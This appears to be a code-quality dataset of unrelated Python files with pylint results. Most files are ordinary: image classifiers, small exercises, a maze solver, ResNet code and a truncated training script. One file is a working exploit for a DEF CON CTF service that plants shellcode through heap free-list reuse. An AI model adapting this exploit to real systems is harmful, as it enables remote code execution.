60   
61   print 'Enable password: ""' + pw + '""'
62   
63   print ""enable "" + pw
64   s.send('enable ' + pw + '\n')
65   
66   print recv_until(s, ""# "")
67   print ""flag""
68   s.send('flag\n')
69   print recv_until(s, ""# "")
70   print ""quit""
71   s.send('quit\n')
","27 - error: syntax-error
"
"1   #!/usr/bin/env python
2   
3   import socket, subprocess, sys
4   from struct import pack, unpack
5   
6   global scenes
7   global officers
8   
9   scenes = {}
10   officers = {}
11   
12   remote = len(sys.argv) > 1
13   
14   PORT = 8888
15   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
16   if remote:
17   	HOST = ""dosfun4u_5d712652e1d06a362f7fc6d12d66755b.2014.shallweplayaga.me""
18   else:
19   	HOST = '127.0.0.1'
20   
21   def chksum(data):
22   	ret = 0
23   	for d in data:
24   		ret += ord(d)
25   	return ret & 0xffff
26   
27   def add_officer(officer_id, status=0, x=0, y=0):
28   	global officers
29   	print 'update' if officers.has_key(officer_id) and officers[officer_id] else 'add', 'officer', hex(officer_id)
30   	officers[officer_id] = True
31   	payload = pack('H', 0x7d0)
32   	payload += pack('H', officer_id)
33   	payload += pack('H', status)
34   	payload += pack('H', x) 
35   	payload += pack('H', y)
36   	payload += pack('H', 0x0)
37   	return payload
38   
39   def remove_officer(officer_id):
40   	global officers
41   	print 'remove officer', hex(officer_id), 'should work' if officers.has_key(officer_id) and officers[officer_id] else 'should fail'
42   	officers[officer_id] = False
43   	payload = pack('H', 0xbb8)
44   	payload += pack('H', officer_id)
45   	return payload
46   
47   def add_scene(scene_id, data2, data3, inline_data='', x=0, y=0):
48   	global scenes
49   	print 'update' if scenes.has_key(scene_id) and scenes[scene_id] else 'add', 'scene', hex(scene_id)
50   	scenes[scene_id] = True
51   	size1 = len(inline_data)/2
52   	size2 = len(data2)
53   	size3 = len(data3)
54   	payload = pack('H', 0xfa0)
55   	payload += pack('H', scene_id)
56   	payload += pack('H', x)
57   	payload += pack('H', y)
58   	payload += pack('B', size1)
59   	payload += pack('B', size2)
60   	payload += pack('H', size3)
61   	payload += pack('H', 0)
62   	payload += inline_data[:size1*2]
63   	payload += data2
64   	payload += data3
65   	return payload
66   
67   def recv_all(s, size):
68   	ret = []
69   	received = 0
70   	while size > received:
71   		c = s.recv(size-received)
72   		if c == '':
73   			raise Exception('Connection closed')
74   		ret.append(c)
75   		received += len(c)
76   	return ''.join(ret)
77   
78   def recv_until(s, pattern):
79   	ret = ''
80   	while True:
81   		c = s.recv(1)
82   		if c == '':
83   			raise Exception(""Connection closed"")
84   		ret += c
85   		if ret.find(pattern) != -1:
86   			break
87   	return ret
88   
89   s.connect((HOST, PORT))
90   
91   if remote:
92   	print s.recv(4096)
93   	buf = s.recv(4096)
94   	print buf
95   	data = buf.split(' ')[0]
96   	print 'challenge = {}'.format(data)
97   	print 'hashcatting...'
98   	p = subprocess.Popen(['./hashcat', data], stdout=subprocess.PIPE);
99   	result = p.communicate()[0].strip('\n\r\t ')
100   	print 'response = {}'.format(result)
101   	s.send(result)
102   
103   def send_cmd(s,payload,recvLen=0):
104   	payload += pack('H', chksum(payload))
105   	s.send(payload)
106   	return recv_all(s, recvLen)
107   
108   shellcode = open('shellcode', 'rb').read()
109   
110   print 'Getting block into free-list'
111   send_cmd(s,add_officer(1),5)
112   send_cmd(s,remove_officer(1),5)
113   print 'Adding officer to reuse block from free-list'
114   send_cmd(s,add_officer(0xc),5)
115   print 'Writing shellcode to 008f:0000'
116   send_cmd(s,add_scene(1, pack(""<HHHHHH"", 0xc, 0, 0x4688, 0x8f, 0, 0), shellcode),5)
117   print 'Modifying officer structure to include pointer to fake officer on stack'
118   send_cmd(s,add_scene(2, pack(""<HHHHHH"", 1, 0, 0, 0, 0x47aa, 0x011f), ""lolololol""),5)
119   print 'Writing return to shellcode on stack'
120   send_cmd(s,add_officer(0x945, 0x1d26, 0x10, 0x97),5)
121   
122   print 'Receiving response...'
123   print 'Key 1:', recv_until(s,'\n').replace('\x00', '')[:-1]
124   print 'Key 2:', recv_until(s,'\n')[:-1]
","29 - error: syntax-error
"
"1   import tkinter as tk
2   from tkinter import filedialog
3   from tkinter import *
4   from PIL import Image, ImageTk
5   import numpy
6   from keras.models import load_model
7   model = load_model('BienBao.h5')
8   class_name = {
9       1:'Speed limit (20km/h)',
10       2:'Speed limit (30km/h)',
11       3:'Speed limit (50km/h)',
12       4:'Speed limit (60km/h)',
13       5:'Speed limit (70km/h)',
14       6:'Speed limit (80km/h)',
15       7:'End of speed limit (80km/h)',
16       8:'Speed limit (100km/h)',
17       9:'Speed limit (120km/h)',
18       10:'No passing',
19       11:'No passing veh over 3.5 tons',
20       12:'Right-of-way at intersection',
21       13:'Priority road',
22       14:'Yield',
23       15:'Stop',
24       16:'No vehicles',
25       17:'Veh > 3.5 tons prohibited',
26       18:'No entry',
27       19:'General caution',
28       20:'Dangerous curve left',
29       21:'Dangerous curve right',
30       22:'Double curve',
31       23:'Bumpy road',
32       24:'Slippery road',
33       25:'Road narrows on the right',
34       26:'Road work',
35       27:'Traffic signals',
36       28:'Pedestrians',
37       29:'Children crossing',
38       30:'Bicycles crossing',
39       31:'Beware of ice/snow',
40       32:'Wild animals crossing',
41       33:'End speed + passing limits',
42       34:'Turn right ahead',
43       35:'Turn left ahead',
44       36:'Ahead only',
45       37:'Go straight or right',
46       38:'Go straight or left',
47       39:'Keep right',
48       40:'Keep left',
49       41:'Roundabout mandatory',
50       42:'End of no passing',
51       43:'End no passing veh > 3.5 tons'
52   }
53   
54   top=tk.Tk()
55   top.geometry('800x600')
56   top.title('Phan loai bien bao giao thong')
57   top.configure(background='#CDCDCD')
58   label = Label(top, background = '#CDCDCD', font=('arial',15,'bold'))
59   label.place(x=0, y=0, relwidth = 1, relheight = 1)
60   
61   sign_image = Label(top)
62   def classify(file_path):
63       global label_packed
64       image = Image.open(file_path)
65       image = image.resize((30, 30))
66       image = numpy.expand_dims(image, axis=0)
67       image = numpy.array(image)
68       print(image.shape)
69       pred = model.predict_classes([image])[0]
70       sign = class_name[pred+1]
71       print(sign)
72       label.configure(foreground = '#011638', text = sign)
73   
74   
75   def show_classify_button(file_path):
76       classify_button = Button(top,text='Phan loai', command = lambda : classify(file_path), padx=10, pady=5)
77       classify_button.configure(background='GREEN', foreground = 'white', font = ('arial', 10, 'bold'))
78       classify_button.place(relx = 0.79, rely = 0.46)
79   
80   def upload_image():
81       try:
82           file_path = filedialog.askopenfilename()
83           uploaded = Image.open(file_path)
84           uploaded.thumbnail(((top.winfo_width()/2.25),
85                               (top.winfo_height()/2.25)))
86           im = ImageTk.PhotoImage(uploaded)
87           sign_image.configure(image= im)
88           sign_image.image = im
89           label.configure(text='')
90           show_classify_button(file_path)
91       except:
92           pass
93   
94   upload = Button(top, text='Upload an image', command=upload_image, padx = 10, pady = 5)
95   upload.configure(background='#364156', foreground = 'white', font = ('arial', 10, 'bold'))
96   
97   upload.pack(side = BOTTOM, pady = 50)
98   sign_image.pack(side=BOTTOM, expand = True)
99   label.pack(side = BOTTOM, expand = True)
100   heading = Label(top, text = 'Bien bao giao thong cua ban', pady = 20, font = ('arial', 20, 'bold'))
101   heading.configure(background = '#CDCDCD', foreground = '#364156')
102   heading.pack()
103   top.mainloop()","3 - warning: wildcard-import
63 - warning: global-variable-not-assigned
91 - warning: bare-except
3 - warning: unused-wildcard-import
"
"1   def switch(on_strike):
2        players = {1,2}
3        return list(players.difference(set([on_strike])))[0]
4    
5    
6   def get_player(previous_score, previous_player, previous_bowl_number):
7       if previous_score%2 == 0 and (previous_bowl_number%6 !=0 or previous_bowl_number ==0):
8            player = previous_player
9       elif previous_score%2 != 0 and previous_bowl_number % 6 == 0:
10            player = previous_player
11       else:
12            player = switch(previous_player)
13       return player
14    
15    
16    
17   a = [1, 2, 0, 0, 4, 1, 6, 2, 1, 3]
18   player_turns = []
19   player_score_chart = {1:0, 2:0}
20   total_score = 0
21    
22   previous_score=0
23   previous_player=1
24   previous_bowl_number=0
25    
26   for runs in a:
27       player_turns.append(get_player(previous_score, previous_player, previous_bowl_number))
28       previous_bowl_number+=1
29       previous_score=runs
30       previous_player=player_turns[-1]
31       player_score_chart[previous_player] += previous_score
32       total_score += previous_score
33    
34   print 'Total Score : ', total_score
35   print 'Batsman 1 Score : ', player_score_chart[1]
36   print 'Batsman 2 Score : ', player_score_chart[2]
","34 - error: syntax-error
"
"1   n=int(input(""enter the numbers u want to print:""))
2   for i in range(1,n+1):
3       if(i%3==0):
4           print ('Fizz')
5           continue
6       elif(i%5==0):
7           print ('Buzz')
8           continue
9       print i
10       
11   	
","9 - error: syntax-error
"
"1   arr=[1,2,3,5,8,4,7,9,1,4,12,5,6,5,2,1,0,8,1]
2   a = [None] * len(arr);    
3   visited = 0;
4   for i in range(0, len(arr)):
5       count = 1;
6       for j in range(i+1, len(arr)):    
7           if(arr[i] == arr[j]):    
8               count = count + 1;
9               a[j] = visited;    
10           if(a[i] != visited):
11               a[i] = count;  
12   for i in range(0, len(a)):    
13       if(a[i] != visited):    
14           print("" ""+ str(arr[i]) +"" has occured ""+ str(a[i])+"" times"");    
","2 - warning: unnecessary-semicolon
3 - warning: unnecessary-semicolon
5 - warning: unnecessary-semicolon
8 - warning: unnecessary-semicolon
9 - warning: unnecessary-semicolon
11 - warning: unnecessary-semicolon
14 - warning: unnecessary-semicolon
"
"1   def returnSum(dict):
2       sum=0
3       for i in dict:
4           sum=sum+dict[i]
5       return sum
6   dict={'Rick':85,'Amit':42,'George':53,'Tanya':60,'Linda':35}
7   print 'sum:', returnSum(dict)
","7 - error: syntax-error
"
"1   # represent the ""board"" in code
2   
3   # dependencies
4   import random
5   
6   class Board:
7       def __init__(self, width=10):
8           self.width = width
9           self.height = width * 2
10   
11           self.WALL_CHANCE = .25
12           self.FLOOR_CHANCE = .15
13   
14           # create the grid
15           self.create_random_grid()
16   
17       def create_random_grid(self):
18           # reset old grid
19           self.grid = []
20   
21           # generate cells for new grid
22           for i in range(self.width * self.height):
23               # is the cell at the left, right, top, or bottom?
24               is_left = True if i % self.width == 0 else False
25               is_right = True if i % self.width == self.width-1 else False
26               is_top = True if i < self.width else False
27               is_bottom = True if i > (self.width * self.height - self.width) else False
28   
29               # create the cell
30               cell = {
31                   ""left"" : is_left,
32                   ""right"" : is_right,
33                   ""roof"" : is_top,
34                   ""floor"" : is_bottom,
35                   ""ID"" : i
36               }
37   
38               # append to grid
39               self.grid.append(cell)
40   
41           # randomly generate walls
42           total = self.width * self.height 
43           horizontal_amount = int(total * self.FLOOR_CHANCE)
44           verticle_amount = int(total * self.WALL_CHANCE)
45   
46           # generate the walls
47           for _i in range(verticle_amount):
48               random_index = random.randrange(0, total)
49   
50               adding_num = -1 if random_index == total - 1 else 1
51               first = ""right"" if adding_num == 1 else ""left""
52               second = ""right"" if first == ""left"" else ""left""
53               
54               self.grid[random_index][first] = True
55               self.grid[random_index + adding_num][second] = True
56   
57           # generate the floors
58           for _i in range(horizontal_amount):
59               random_index = random.randrange(0, total)
60   
61               adding_num = self.width * -1 if random_index > (total - self.width) else self.width
62               first = ""floor"" if adding_num == self.width else ""roof""
63               second = ""floor"" if first == ""roof"" else ""roof""
64   
65               self.grid[random_index][first] = True
66               self.grid[random_index + adding_num - 1][second] = True
67   
68   
69       def can_move_from(self, cell_index):
70           # TODO this works but its a lot of repeated code. Can it be made better?
71   
72           # can you move left
73           can_move_left = False
74           is_left = True if cell_index % self.width == 0 else False
75           if not is_left and self.grid[cell_index][""left""] == False:
76               left_cell = self.grid[cell_index - 1]
77               is_wall_left = True if left_cell[""right""] == True else False
78               can_move_left = True if not is_wall_left else False
79   
80           # can you move right
81           can_move_right = False
82           is_right = True if cell_index % self.width == self.width-1 else False
83           if not is_right and self.grid[cell_index][""right""] == False:
84               right_cell = self.grid[cell_index + 1]
85               is_wall_right = True if right_cell[""left""] == True else False
86               can_move_right = True if not is_wall_right else False
87    
88           # can you move up
89           can_move_up = False
90           is_top = True if cell_index < self.width else False
91           if not is_top and self.grid[cell_index][""roof""] == False:
92               top_cell = self.grid[cell_index - self.width]
93               is_wall_top = True if top_cell[""floor""] == True else False
94               can_move_up = True if not is_wall_top else False
95   
96           # can you move down
97           can_move_down = False
98           is_bottom = True if cell_index > (self.width * self.height - self.width) else False
99           if not is_bottom and self.grid[cell_index][""floor""] == False:
100               bottom_cell = self.grid[cell_index + self.width]
101               is_wall_bottom = True if bottom_cell[""roof""] == True else False
102               can_move_down = True if not is_wall_bottom else False
103   
104           # return the results
105           return can_move_left, can_move_right, can_move_up, can_move_down
106   
107       def BFS(self):
108           """"""breadth first search to find the quickest way to the bottom""""""
109           start_i = random.randrange(0,self.width)
110           paths = [ [start_i] ]
111           solved = False
112           dead_ends = []
113   
114           while not solved:
115               for path in paths:
116                   # find all possibles moves from path
117                   if len(dead_ends) >= len(paths) or len(paths) > 10000: # TODO this solution sucks
118                       return False, False
119   
120                   # NOTE order is left right up down
121                   if path[-1] >= (self.width * self.height - self.width):
122                       solved = True
123                       return paths, paths.index(path)
124   
125                   possible_moves = self.can_move_from(path[-1])
126   
127                   if True in possible_moves:
128                       move_order = [-1, 1, (self.width) * -1, self.width]
129                       first_append_flag = False
130                       origonal_path = path.copy()
131                       for i in range(4):
132                           possible_move = possible_moves[i]
133                           if possible_move:
134                               move = move_order[i]
135   
136                               next_index = origonal_path[-1] + move
137                               if not next_index in origonal_path:
138   
139                                   if not first_append_flag:
140                                       path.append(next_index)
141                                       first_append_flag = True
142                                   else:
143                                       new_path = origonal_path.copy()
144                                       new_path.append(next_index)
145                                       paths.append(new_path)
146                       if not first_append_flag:
147                           dead_ends.append(paths.index(path))
148                   else:
149                       dead_ends.append(paths.index(path))
150   
151   
152   
153       def pretty_print_BFS(self, path):
154           for i in range(self.width * self.height):
155               cell = self.grid[i]
156               in_path = True if cell[""ID""] in path else False
157   
158               number_str = str(i)
159   
160               if len(number_str) == 1:
161                   number_str += ""  ""
162               elif len(number_str) == 2:
163                   number_str += "" ""
164               
165               end_str = ""\n"" if i % self.width == self.width-1 else "" ""
166   
167               if in_path:
168                   print('\033[92m' + number_str + '\033[0m', end=end_str)
169               else:
170                   print(number_str, end=end_str)
171           print(path)
172   
173   
174   
175   
176   if __name__ == ""__main__"":
177       b = Board(10)
178   
179       paths, index = b.BFS()
180   
181       if paths and index:
182           b.pretty_print_BFS(paths[index])
183       else:
184           print('ljfdsakfdl')
185   
186       # can_move_left, can_move_right, can_move_up, can_move_down = b.can_move_from(0)
187   
188       # print(""can_move_left "", can_move_left)
189       # print(""can_move_right "", can_move_right)
190       # print(""can_move_up "", can_move_up)
191       # print(""can_move_down "", can_move_down)
","70 - warning: fixme
117 - warning: fixme
24 - refactor: simplifiable-if-expression
25 - refactor: simplifiable-if-expression
26 - refactor: simplifiable-if-expression
27 - refactor: simplifiable-if-expression
69 - refactor: too-many-locals
74 - refactor: simplifiable-if-expression
77 - refactor: simplifiable-if-expression
78 - refactor: simplifiable-if-expression
82 - refactor: simplifiable-if-expression
85 - refactor: simplifiable-if-expression
86 - refactor: simplifiable-if-expression
90 - refactor: simplifiable-if-expression
93 - refactor: simplifiable-if-expression
94 - refactor: simplifiable-if-expression
98 - refactor: simplifiable-if-expression
101 - refactor: simplifiable-if-expression
102 - refactor: simplifiable-if-expression
110 - warning: redefined-outer-name
145 - warning: modified-iterating-list
114 - refactor: too-many-nested-blocks
107 - refactor: inconsistent-return-statements
156 - refactor: simplifiable-if-expression
"
"1   # use pygame to show the board on a window
2   
3   # dependencies
4   import pygame, random
5   
6   class Window:
7       def __init__(self, board):
8           # init py game
9           pygame.init()
10   
11           # width height
12           self.WIDTH = 600
13           self.HEIGHT = 600
14   
15           # diffenet display modes
16           self.display_one = False
17           self.display_all = False
18   
19           # place holder
20           self.solution = []
21           self.display_all_c = 0
22   
23           # the board to display on the window
24           self.board = board
25   
26           # define the dimensions of the cells of the board
27           self.cell_width = self.WIDTH // self.board.width
28   
29           # define the left padding for the grid
30           total_width = self.cell_width * self.board.width
31           self.left_padding = (self.WIDTH - total_width) // 2
32   
33   
34           # colors
35           self.COLORS = {
36               ""BLACK"" : (255, 255, 255),
37               ""GREY"" : (230, 230, 230),
38               ""BLUE"" : (0, 0, 255),
39               ""RED"" : (255, 0, 0),
40               ""YELLOW"" : (212, 175, 55) 
41           }
42   
43       def create_random_color(self):
44           return (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
45   
46       def create_window(self):
47           # define window
48           self.WIN = pygame.display.set_mode( (self.WIDTH, self.HEIGHT) )
49   
50           # name window
51           pygame.display.set_caption(""LIGHT NING"")
52   
53           # logo/icon for window
54           logo = pygame.image.load(""images/logo.png"")
55           pygame.display.set_icon(logo)
56   
57       def get_BFS(self):
58           solved = False
59           while not solved:
60               self.board.create_random_grid()
61               paths, index = self.board.BFS()
62   
63               if paths != False and index != False:            
64                   self.solution = paths[index]
65                   solved = True
66   
67                   self.paths = paths
68                   self.solution_i = index
69   
70       def draw_grid_solution(self):
71           fflag = True
72           for i in range(self.board.width * self.board.height):
73               if not i in self.solution: continue
74   
75               # might not work
76               col_num = i % self.board.width
77               row_num = i // self.board.width
78   
79               x_pos = self.left_padding + (col_num * self.cell_width)
80               y_pos = row_num * self.cell_width
81   
82               # define rect
83               r = pygame.Rect(x_pos, y_pos, self.cell_width, self.cell_width)
84   
85               # draw the rectangle
86               pygame.draw.rect(self.WIN, self.COLORS[""YELLOW""], r)
87   
88       def draw_BFS(self):
89           if self.display_all_c >= len(self.paths):
90               self.display_all_c = 0
91   
92           # generate a color for each path
93           path_colors = []
94           for path in self.paths:
95               path_colors.append(self.create_random_color())
96           path_colors[-1] = (0, 0 ,0)
97   
98           temp = self.paths.pop(self.display_all_c)
99           self.paths.append(temp)
100   
101           for path in self.paths:
102               for i in path:
103                   # might not work
104                   col_num = i % self.board.width
105                   row_num = i // self.board.width
106   
107                   x_pos = self.left_padding + (col_num * self.cell_width)
108                   y_pos = row_num * self.cell_width
109   
110                   # define rect
111                   r = pygame.Rect(x_pos, y_pos, self.cell_width, self.cell_width)
112   
113                   # draw the rectangle
114                   pygame.draw.rect(self.WIN, path_colors[self.paths.index(path)], r)
115   
116           self.display_all_c += 1
117           
118                   
119       def draw_window(self):
120           self.WIN.fill(self.COLORS[""GREY""])
121   
122           if self.display_one:
123               self.draw_grid_solution()
124           elif self.display_all:
125               self.draw_BFS()
126   
127           pygame.display.update()
128   
129       def main(self):
130           # create window
131           self.create_window()
132   
133           self.running = True
134           while self.running:
135               for event in pygame.event.get():
136                   if event.type == pygame.QUIT:
137                       self.running = False
138   
139                   elif event.type == pygame.KEYDOWN:
140                       if event.key == pygame.K_0:
141                           self.get_BFS()
142                       elif event.key == pygame.K_1:
143                           # toggle display one
144                           self.display_one = not self.display_one
145                           if self.display_one:
146                               self.display_all = False
147                       elif event.key == pygame.K_2:
148                           # toggle display all
149                           self.display_all = not self.display_all
150                           if self.display_all:
151                               self.display_all_c = 0
152                               self.display_one = False
153               
154               self.draw_window()
155   
156   if __name__ == ""__main__"":
157       win = Window()
158   
159       win.main()","6 - refactor: too-many-instance-attributes
71 - warning: unused-variable
48 - warning: attribute-defined-outside-init
67 - warning: attribute-defined-outside-init
68 - warning: attribute-defined-outside-init
133 - warning: attribute-defined-outside-init
137 - warning: attribute-defined-outside-init
157 - error: no-value-for-parameter
"
"1   # this could and will be better i just needed to make it here as a 
2   # proof of concept but it will be online and better later
3   
4   import os, sys
5   
6   BASE_PATH = os.path.dirname(os.path.dirname(os.path.abspath(__file__))) # adds project dir to places it looks for the modules
7   sys.path.append(BASE_PATH)
8   
9   from lib.board import Board
10   from lib.window import Window
11   
12   b = Board()
13   win = Window(b)
14   
15   win.main()","Clean Code: No Issues Detected
"
"1   from flask import Flask, render_template, request, jsonify
2   from flask_cors import CORS
3   import json
4   import numpy as np
5   
6   app = Flask(__name__)
7   CORS(app)
8   
9   
10   @app.route('/transpose', methods=[""POST""])
11   def homepage():
12       data = request.json
13       result = None
14       error = """"
15       try:
16           mat = data[""matrix""]
17           mat = np.array(mat)
18           result = mat.T.tolist()
19           error = """"
20       except KeyError as e:
21           error = ""Key %s not found"" % (str(e))
22           pass
23       except Exception as e:
24           error = str(e)
25           pass
26       return jsonify({""result"": result, ""error"": error})
27   
28   
29   app.run()
","23 - warning: broad-exception-caught
22 - warning: unnecessary-pass
25 - warning: unnecessary-pass
1 - warning: unused-import
3 - warning: unused-import
"
"1   from tkinter import *
2   from tkinter import ttk
3   from tkinter import filedialog
4   import test_python3
5   
6   class Root(Tk):
7       def __init__(self):
8           super(Root, self).__init__()
9           self.title(""Malware Detection"")
10           self.minsize(500, 300)
11   
12           self.labelFrame = ttk.LabelFrame(self, text = ""     Open File"")
13           self.labelFrame.grid(column = 0, row = 1, padx = 200, pady = 20)
14   
15           self.button()
16   
17   
18   
19       def button(self):
20           self.button = ttk.Button(self.labelFrame, text = ""Browse A File"",command = self.fileDialog)
21           self.button.grid(column = 1, row = 1)
22   
23   
24       def fileDialog(self):
25   
26           self.filename = filedialog.askopenfilename(initialdir =  ""/"", title = ""Select A File"")
27           self.label = ttk.Label(self.labelFrame, text = """")
28           self.label.grid(column = 1, row = 2)
29           self.label.configure(text = self.filename)
30   
31   
32   
33   
34   root = Root()
35   root.mainloop()","1 - warning: wildcard-import
8 - refactor: super-with-arguments
15 - error: not-callable
19 - error: method-hidden
26 - warning: attribute-defined-outside-init
27 - warning: attribute-defined-outside-init
4 - warning: unused-import
1 - warning: unused-wildcard-import
"
"1   from .resnext101 import ResNeXt101
","1 - error: relative-beyond-top-level
1 - warning: unused-import
"
"1   from .resnet import ResNet, BasicBlock, Bottleneck
2   import torch
3   from torch import nn
4   from .config import resnet50_path
5   
6   model_urls = {
7       'resnet18': 'https://download.pytorch.org/models/resnet18-5c106cde.pth',
8       'resnet34': 'https://download.pytorch.org/models/resnet34-333f7ec4.pth',
9       'resnet50': 'https://download.pytorch.org/models/resnet50-19c8e357.pth',
10       'resnet101': 'https://download.pytorch.org/models/resnet101-5d3b4d8f.pth',
11       'resnet152': 'https://download.pytorch.org/models/resnet152-b121ed2d.pth',
12   }
13   
14   class ResNet50(nn.Module):
15       def __init__(self):
16           super(ResNet50, self).__init__()
17           net = ResNet(last_stride=2,
18                       block=Bottleneck, frozen_stages=False,
19                       layers=[3, 4, 6, 3])
20           net.load_param(resnet50_path)
21   
22           self.layer0 = net.layer0
23           self.layer1 = net.layer1
24           self.layer2 = net.layer2
25           self.layer3 = net.layer3
26           self.layer4 = net.layer4
27   
28       def forward(self, x):
29           layer0 = self.layer0(x)
30           layer1 = self.layer1(layer0)
31           layer2 = self.layer2(layer1)
32           layer3 = self.layer3(layer2)
33           layer4 = self.layer4(layer3)
34           return layer4
35       
36       def load_param(self, trained_path):
37           param_dict = torch.load(trained_path)
38           for i in param_dict:
39               if 'classifier' in i or 'arcface' in i:
40                   continue
41               self.state_dict()[i].copy_(param_dict[i])
42           print('Loading pretrained model from {}'.format(trained_path))
43   
44   
45   class ResNet50_BIN(nn.Module):
46       def __init__(self):
47           super(ResNet50_BIN, self).__init__()
48           net = ResNet(last_stride=2,
49                       block=IN_Bottleneck, frozen_stages=False,
50                       layers=[3, 4, 6, 3])
51           net.load_param(resnet50_path)
52   
53           self.layer0 = net.layer0
54           self.layer1 = net.layer1
55           self.layer2 = net.layer2
56           self.layer3 = net.layer3
57           self.layer4 = net.layer4
58   
59       def forward(self, x):
60           layer0 = self.layer0(x)
61           layer1 = self.layer1(layer0)
62           layer2 = self.layer2(layer1)
63           layer3 = self.layer3(layer2)
64           layer4 = self.layer4(layer3)
65           return layer4
66       
67       def load_param(self, trained_path):
68           param_dict = torch.load(trained_path)
69           for i in param_dict:
70               if 'classifier' in i or 'arcface' in i:
71                   continue
72               self.state_dict()[i].copy_(param_dict[i])
73           print('Loading pretrained model from {}'.format(trained_path))
74   
75   
76   class ResNet50_LowIN(nn.Module):
77       def __init__(self):
78           super(ResNet50_LowIN, self).__init__()
79           net = ResNet_LowIN(last_stride=2,
80                       block=Bottleneck, frozen_stages=False,
81                       layers=[3, 4, 6, 3])
82           net.load_param(resnet50_path)
83   
84           self.layer0 = net.layer0
85           self.layer1 = net.layer1
86           self.layer2 = net.layer2
87           self.layer3 = net.layer3
88           self.layer4 = net.layer4
89   
90       def forward(self, x):
91           layer0 = self.layer0(x)
92           layer1 = self.layer1(layer0)
93           layer2 = self.layer2(layer1)
94           layer3 = self.layer3(layer2)
95           layer4 = self.layer4(layer3)
96           return layer4
97       
98       def load_param(self, trained_path):
99           param_dict = torch.load(trained_path)
100           for i in param_dict:
101               if 'classifier' in i or 'arcface' in i:
102                   continue
103               self.state_dict()[i].copy_(param_dict[i])
104           print('Loading pretrained model from {}'.format(trained_path))
","1 - error: relative-beyond-top-level
4 - error: relative-beyond-top-level
16 - refactor: super-with-arguments
47 - refactor: super-with-arguments
49 - error: undefined-variable
78 - refactor: super-with-arguments
79 - error: undefined-variable
1 - warning: unused-import
"
"1   resnet50_path = './resnet/resnet50-19c8e357.pth'
","Clean Code: No Issues Detected
"
"1   from .make_model import ResNet50, ResNet50_BIN, ResNet50_LowIN","1 - error: relative-beyond-top-level
1 - warning: unused-import
1 - warning: unused-import
1 - warning: unused-import
"
"1   import datetime
2   import os
3   import time
4   
5   import torch
6   from torch import nn
7   from torch import optim
8   from torch.autograd import Variable
9   from torch.utils.data import DataLoader
10   from torchvision import transforms
11   import pandas as pd
12   import numpy as np
13   
14   import joint_transforms
15   from config import msra10k_path, MTDD_train_path
16   from datasets import ImageFolder_joint
17   from misc import AvgMeter, check_mkdir, cal_sc
18   from model import R3Net, SDCNet
19   from torch.backends import cudnn
20   
21   cudnn.benchmark = True
22   
23   torch.manual_seed(2021)
24   torch.cuda.set_device(6)
25   
26   csv_path = './label_DUTS-TR.csv'
27   ckpt_path = './ckpt'
28   exp_name ='SDCNet'
29   
30   args = {
31       'iter_num': 30000,
32       'train_batch_size': 16,
33       'last_iter': 0,
34       'lr': 1e-3,
35       'lr_decay': 0.9,
36       'weight_decay': 5e-4,
37       'momentum': 0.9,
38       'snapshot': ''
39   }
40   
41   joint_transform = joint_transforms.Compose([
42       joint_transforms.RandomCrop(300),
43       joint_transforms.RandomHorizontallyFlip(),
44       joint_transforms.RandomRotate(10)
45   ])
46   img_transform = transforms.Compose([
47       transforms.ToTensor(),
48       transforms.Normalize([0.485, 0.456, 0.406], [0.229, 0.224, 0.225])
49   ])
50   target_transform = transforms.ToTensor()
51   to_pil = transforms.ToPILImage()
52   
53   all_data = pd.read_csv(csv_path)
54   train_set = ImageFolder_joint(all_data, joint_transform, img_transform, target_transform)
55   train_loader = DataLoader(train_set, batch_size=args['train_batch_size'], num_workers=0, shuffle=True, drop_last=True)#
56   
57   log_path = os.path.join(ckpt_path, exp_name, str(datetime.datetime.now()) + '.txt')
58   
59   
60   def main():
61       net = SDCNet(num_classes = 5).cuda().train() # 
62       
63       print('training in ' + exp_name)
64       optimizer = optim.SGD([
65           {'params': [param for name, param in net.named_parameters() if name[-4:] == 'bias'],
66            'lr': 2 * args['lr']},
67           {'params': [param for name, param in net.named_parameters() if name[-4:] != 'bias'],
68            'lr': args['lr'], 'weight_decay': args['weight_decay']}
69       ], momentum=args['momentum'])
70   
71       if len(args['snapshot']) > 0:
72           print('training resumes from ' + args['snapshot'])
73           net.load_state_dict(torch.load(os.path.join(ckpt_path, exp_name, args['snapshot'] + '.pth')))
74           optimizer.load_state_dict(torch.load(os.path.join(ckpt_path, exp_name, args['snapshot'] + '_optim.pth')))
75           optimizer.param_groups[0]['lr'] = 2 * args['lr']
76           optimizer.param_groups[1]['lr'] = args['lr']
77   
78       check_mkdir(ckpt_path)
79       check_mkdir(os.path.join(ckpt_path, exp_name))
80       open(log_path, 'w').write(str(args) + '\n\n')
81       train(net, optimizer)
82   
83   
84   def train(net, optimizer):
85       start_time = time.time()
86       curr_iter = args['last_iter']
87       num_class = [0, 0, 0, 0, 0]
88       while True:
89           total_loss_record, loss0_record, loss1_record, loss2_record = AvgMeter(), AvgMeter(), AvgMeter(), AvgMeter()
90   
91           batch_time = AvgMeter()
92           end = time.time()
93           print('-----begining the first stage, train_mode==0-----')
94           for i, data in enumerate(train_loader):
95               optimizer.param_groups[0]['lr'] = 2 * args['lr'] * (1 - float(curr_iter) / args['iter_num']
96                                                                   ) ** args['lr_decay']
97               optimizer.param_groups[1]['lr'] = args['lr'] * (1 - float(curr_iter) / args['iter_num']
98                                                               ) ** args['lr_decay']
99   
100               inputs, gt, labels = data
101               print(labels)
102               # depends on the num of classes
103               cweight = torch.tensor([0.5, 0.75, 1, 1.25, 1.5])
104               #weight = torch.ones(size=gt.shape)
105               weight = gt.clone().detach()
106               sizec = labels.numpy()
107               #ta = np.zeros(shape=gt.shape)
108               '''
109               np.zeros(shape=labels.shape)
110               sc = gt.clone().detach()
111               for i in range(len(sizec)):
112                   gta = np.array(to_pil(sc[i,:].data.squeeze(0).cpu()))#
113                   #print(gta.shape)
114                   labels[i] = cal_sc(gta)
115                   sizec[i] = labels[i]
116               print(labels)
117               '''
118               batch_size = inputs.size(0)
119               inputs = Variable(inputs).cuda()
120               gt = Variable(gt).cuda()
121               labels = Variable(labels).cuda()
122   
123               #print(sizec.shape)
124   
125               optimizer.zero_grad()
126               p5, p4, p3, p2, p1, predict1, predict2, predict3, predict4, predict5, predict6, predict7, predict8, predict9, predict10, predict11 = net(inputs, sizec) # mode=1
127   
128               criterion = nn.BCEWithLogitsLoss().cuda()
129               criterion2 = nn.CrossEntropyLoss().cuda()
130   
131               gt2 = gt.long()
132               gt2 = gt2.squeeze(1)
133   
134               l5 = criterion2(p5, gt2)
135               l4 = criterion2(p4, gt2)
